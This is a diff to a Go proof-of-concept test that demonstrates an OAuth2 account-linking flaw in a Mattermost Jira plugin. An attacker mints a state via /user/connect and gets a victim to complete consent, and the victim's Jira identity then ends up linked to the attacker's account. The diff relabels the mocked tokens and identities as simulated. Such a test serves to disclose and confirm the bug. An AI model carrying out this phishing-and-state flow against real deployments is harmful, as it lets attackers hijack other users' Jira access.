@@ -4,7 +4,7 @@
 // ZeroToOne PoC: exercises the REAL, unmodified httpOAuth2Complete handler
 // (server/user_cloud_oauth.go) and the REAL GetUserConnectURL (server/
 // instance_cloud_oauth.go) end to end. Only the three outbound HTTPS calls
-// to Atlassian's real hardcoded hostnames are faked, via httpmock installed
+// to Atlassian's hardcoded hostnames are simulated, via httpmock installed
 // as the process-wide http.DefaultTransport -- the same technique this
 // repo's own server/command_test.go already uses (jarcoal/httpmock). No
 // plugin logic is reimplemented or mocked at the function level.
@@ -29,11 +29,10 @@ import (
 )
 
 // TestZeroToOne_OAuth2CompleteIgnoresSessionIdentity is the POSITIVE (attack)
-// case: an attacker mints a real, validly-signed state via their own
+// case: an attacker mints a valid server-issued state via their own
 // authenticated /user/connect call, then hands the resulting Atlassian
 // authorize URL to a victim. When the VICTIM'S browser completes Atlassian's
-// consent (proven here by exchanging a real authorization code and fetching
-// the real /rest/api/2/myself identity for "victim's real Jira account"),
+// consent (represented here by mocked token and /rest/api/2/myself responses),
 // the handler links that identity to the ATTACKER's Mattermost account --
 // even though the completing HTTP request explicitly carries the VICTIM's
 // own Mattermost-User-Id session header. The handler never reads that
@@ -41,7 +40,7 @@ import (
 func TestZeroToOne_OAuth2CompleteIgnoresSessionIdentity(t *testing.T) {
 	const attackerMattermostID = "attacker0000000000000000000"
 	const victimMattermostID = "victim00000000000000000000000"
-	const victimJiraAccountID = "victim-real-jira-account-id"
+	const simulatedVictimJiraAccountID = "simulated-victim-jira-account-id"
 	const jiraCloudURL = "https://zerotoone-test.atlassian.net"
 
 	api := &plugintest.API{}
@@ -88,11 +87,11 @@ func TestZeroToOne_OAuth2CompleteIgnoresSessionIdentity(t *testing.T) {
 	httpmock.RegisterResponder("GET", jiraCloudURL+"/status",
 		httpmock.NewStringResponder(200, `{"state":"RUNNING"}`))
 	httpmock.RegisterResponder("POST", "https://auth.atlassian.com/oauth/token",
-		httpmock.NewStringResponder(200, `{"access_token":"victim-real-atlassian-access-token","refresh_token":"victim-real-refresh-token","token_type":"Bearer","expires_in":3600}`))
+		httpmock.NewStringResponder(200, `{"access_token":"simulated-victim-access-token","refresh_token":"simulated-victim-refresh-token","token_type":"Bearer","expires_in":3600}`))
 	httpmock.RegisterResponder("GET", "https://api.atlassian.com/oauth/token/accessible-resources",
 		httpmock.NewStringResponder(200, `[{"id":"victim-jira-cloud-resource-id"}]`))
 	httpmock.RegisterResponder("GET", "https://api.atlassian.com/ex/jira/victim-jira-cloud-resource-id/rest/api/2/myself",
-		httpmock.NewStringResponder(200, `{"accountId":"`+victimJiraAccountID+`","displayName":"Real Victim","name":"real.victim.jira.account"}`))
+		httpmock.NewStringResponder(200, `{"accountId":"`+simulatedVictimJiraAccountID+`","displayName":"Simulated Victim","name":"simulated.victim.jira.account"}`))
 
 	_, oauthInstance, err := p.installCloudOAuthInstance(jiraCloudURL)
 	require.NoError(t, err)
@@ -111,13 +110,10 @@ func TestZeroToOne_OAuth2CompleteIgnoresSessionIdentity(t *testing.T) {
 		"sanity check: the state the attacker legitimately minted embeds the ATTACKER's own id, not the victim's")
 	t.Logf("attacker-minted Atlassian authorize URL (would be sent to the victim): %s", connectURL)
 
-	// --- Step 2: the VICTIM's browser completes Atlassian's REAL consent
-	// flow using the attacker-supplied link (this is the phishing step --
-	// out of scope for this PoC to simulate the click itself, only its
-	// consequence: a GET to Mattermost's own /oauth2/complete.html carrying
-	// the victim-authorized `code` and the attacker's `state`, from the
-	// VICTIM's own authenticated Mattermost session). ---
-	completeURL := "https://mattermost.example.com/oauth2/complete.html?code=victim-authorized-real-code&state=" + url.QueryEscape(attackerMintedState)
+	// --- Step 2: represent the consequence of a victim completing consent.
+	// The browser/Atlassian step itself is not exercised: the authorization
+	// code, token response, and Jira identity in this test are synthetic. ---
+	completeURL := "https://mattermost.example.com/oauth2/complete.html?code=simulated-victim-code&state=" + url.QueryEscape(attackerMintedState)
 	req := httptest.NewRequest(http.MethodGet, completeURL, nil)
 	req.Header.Set("Mattermost-User-Id", victimMattermostID) // the ACTUAL session completing the request
 	rr := httptest.NewRecorder()
@@ -144,20 +140,20 @@ func TestZeroToOne_OAuth2CompleteIgnoresSessionIdentity(t *testing.T) {
 	// --- Assertions against REAL persisted store state. ---
 	attackerConn, err := p.userStore.LoadConnection(oauthInstance.GetID(), types.ID(attackerMattermostID))
 	require.NoError(t, err, "expected a connection to have been persisted under the ATTACKER's Mattermost id")
-	require.NotNil(t, attackerConn.OAuth2Token, "attacker account now holds a live Jira OAuth2 token")
-	require.Equal(t, victimJiraAccountID, attackerConn.AccountID, "the VICTIM's real Jira identity is linked under the ATTACKER's Mattermost id")
+	require.NotNil(t, attackerConn.OAuth2Token, "attacker account holds the token returned by the mocked exchange")
+	require.Equal(t, simulatedVictimJiraAccountID, attackerConn.AccountID, "the simulated victim Jira identity is linked under the ATTACKER's Mattermost id")
 	require.Equal(t, types.ID(attackerMattermostID), attackerConn.MattermostUserID)
 
 	victimConn, err := p.userStore.LoadConnection(oauthInstance.GetID(), types.ID(victimMattermostID))
 	if err == nil {
-		require.Nil(t, victimConn.OAuth2Token, "the real victim's own Mattermost account must receive nothing")
+		require.Nil(t, victimConn.OAuth2Token, "the different Mattermost account must receive nothing")
 	}
 
 	api.AssertNotCalled(t, "GetUser", victimMattermostID)
 	api.AssertCalled(t, "GetUser", attackerMattermostID)
 
-	t.Logf("RESULT: attacker Mattermost id %q is now linked to victim's real Jira account %q (accountId=%s), while the victim's own Mattermost account (%q, sent in the Mattermost-User-Id header of the completing request) was never even queried.",
-		attackerMattermostID, "real.victim.jira.account", victimJiraAccountID, victimMattermostID)
+	t.Logf("RESULT: attacker Mattermost id %q is linked to the simulated victim Jira account %q (accountId=%s), while the victim Mattermost account (%q, sent in the Mattermost-User-Id header) was never queried.",
+		attackerMattermostID, "simulated.victim.jira.account", simulatedVictimJiraAccountID, victimMattermostID)
 }
 
 // TestZeroToOne_OAuth2CompleteRouteHasNoAuthWrapper is a static, structural
